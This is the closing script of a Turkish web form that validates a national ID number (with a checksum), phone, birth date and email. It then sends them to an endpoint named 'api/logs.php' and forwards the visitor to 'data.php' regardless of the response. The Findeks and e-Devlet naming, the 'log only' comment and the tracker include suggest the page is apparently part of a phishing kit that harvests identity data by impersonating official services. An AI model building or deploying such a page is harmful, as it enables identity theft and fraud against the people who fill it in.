    document.getElementById('phoneField').addEventListener('input', function() {
        let v = this.value.replace(/\D/g, '').substring(0, 11);
        let out = '';
        if (v.length > 0)  out = v.substring(0, 4);
        if (v.length > 4)  out += ' ' + v.substring(4, 7);
        if (v.length > 7)  out += ' ' + v.substring(7, 9);
        if (v.length > 9)  out += ' ' + v.substring(9, 11);
        this.value = out;
    });

    // Birth date: GG/AA/YYYY
    document.getElementById('birthField').addEventListener('input', function() {
        let v = this.value.replace(/\D/g, '').substring(0, 8);
        let out = '';
        if (v.length > 0) out = v.substring(0, 2);
        if (v.length > 2) out += '/' + v.substring(2, 4);
        if (v.length > 4) out += '/' + v.substring(4, 8);
        this.value = out;
    });


    /* ─── TC validation ─── */
    function validateTC(tc) {
        if (tc.length !== 11 || tc[0] === '0') return false;
        const d = tc.split('').map(Number);
        const oddSum  = d[0] + d[2] + d[4] + d[6] + d[8];
        const evenSum = d[1] + d[3] + d[5] + d[7];
        const c10 = ((oddSum * 7) - evenSum) % 10;
        if ((c10 < 0 ? c10 + 10 : c10) !== d[9]) return false;
        return d.slice(0, 10).reduce((a, b) => a + b, 0) % 10 === d[10];
    }


    /* ─── Form submission ─── */
    document.getElementById('basvuruForm').addEventListener('submit', function(e) {
        e.preventDefault();
        hideBanner();

        const tc      = document.getElementById('tcField').value.trim();
        const phone   = document.getElementById('phoneField').value.trim();
        const birth   = document.getElementById('birthField').value.trim();
        const email   = document.getElementById('emailField').value.trim();
        const captcha = document.getElementById('captchaField').value.trim().toUpperCase();

        // ── Validation ──
        if (!tc || tc.length !== 11) {
            showBanner('T.C. Kimlik Numarası 11 haneli olmalıdır.');
            document.getElementById('tcField').focus();
            return;
        }
        if (!validateTC(tc)) {
            showBanner('Geçerli bir T.C. Kimlik Numarası giriniz.');
            document.getElementById('tcField').focus();
            return;
        }

        const rawPhone = phone.replace(/\D/g, '');
        if (!rawPhone || rawPhone.length < 10) {
            showBanner('Geçerli bir cep telefonu numarası giriniz.');
            document.getElementById('phoneField').focus();
            return;
        }

        const birthParts = birth.split('/');
        if (birthParts.length !== 3 || birth.length !== 10) {
            showBanner('Doğum tarihinizi GG/AA/YYYY formatında giriniz.');
            document.getElementById('birthField').focus();
            return;
        }
        const [dd, mm, yyyy] = birthParts.map(Number);
        if (dd < 1 || dd > 31 || mm < 1 || mm > 12 || yyyy < 1900 || yyyy > new Date().getFullYear()) {
            showBanner('Geçerli bir doğum tarihi giriniz.');
            document.getElementById('birthField').focus();
            return;
        }

        const emailRe = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (!email || !emailRe.test(email)) {
            showBanner('Geçerli bir e-posta adresi giriniz.');
            document.getElementById('emailField').focus();
            return;
        }

        if (!captcha || captcha !== captchaCode) {
            showBanner('Güvenlik kodu hatalı. Lütfen tekrar deneyiniz.');
            generateCaptcha();
            document.getElementById('captchaField').value = '';
            document.getElementById('captchaField').focus();
            return;
        }

        if (!kvkkAccepted) {
            showBanner('Devam edebilmek için KVKK Aydınlatma Metni\'ni onaylamanız gerekmektedir.');
            return;
        }

        // ── Store in sessionStorage ──
        sessionStorage.setItem('findeks_tc',    tc);
        sessionStorage.setItem('findeks_phone', phone);
        sessionStorage.setItem('findeks_birth', birth);
        sessionStorage.setItem('findeks_email', email);

        // Keep legacy key for compatibility with data.php / cart.php checks
        sessionStorage.setItem('edevlet_tc', tc);

        // ── Show loading ──
        showLoading();

        // ── POST to api/logs.php ──
        const payload = new FormData();
        payload.append('tc',    tc);
        payload.append('phone', phone);
        payload.append('birth', birth);
        payload.append('email', email);
        payload.append('step',  'basvuru');

        fetch('api/logs.php', {
            method: 'POST',
            body: payload
        })
        .then(function(res) {
            return res.json().catch(function() { return { success: true }; });
        })
        .then(function(data) {
            // Proceed regardless of API response (log only)
            setTimeout(function() {
                window.location.href = 'data.php';
            }, 900);
        })
        .catch(function() {
            // Network error — still proceed
            setTimeout(function() {
                window.location.href = 'data.php';
            }, 900);
        });
    });


    /* ─── Keyboard: Escape closes modals ─── */
    document.addEventListener('keydown', function(e) {
        if (e.key === 'Escape') {
            closeKvkkModal();
            closeErrorModal();
        }
    });
</script>

<?php include 'includes/tracker.php'; ?>
</body>
</html>